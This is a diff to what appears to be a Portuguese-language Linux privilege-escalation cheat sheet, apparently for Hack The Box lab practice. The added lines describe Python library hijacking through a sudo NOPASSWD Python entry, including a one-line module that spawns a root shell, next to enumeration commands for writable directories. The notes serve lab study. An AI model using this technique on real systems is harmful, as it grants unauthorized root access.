@@ -198,6 +198,13 @@ cat /etc/fstab
 # Lista diretórios temporários e permissões
 ls -l /tmp /var/tmp /dev/shm
 
+# Root com variável de ambiente PYTHONPATH
+sudo -l para ver se PYTHON roda como root NOPASSWD
+conferir se algum arquivo python usa import de biblioteca
+se sim: echo 'import os; os.system("/bin/bash")' > biblioteca-python.py
+sudo /usr/bin/python3 /home/htb-student/arquivo-python.py
+caso o path local que vc criou estiver um nivel acima do path padrão = root
+
 # Procura diretórios graváveis por qualquer usuário
 find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
 
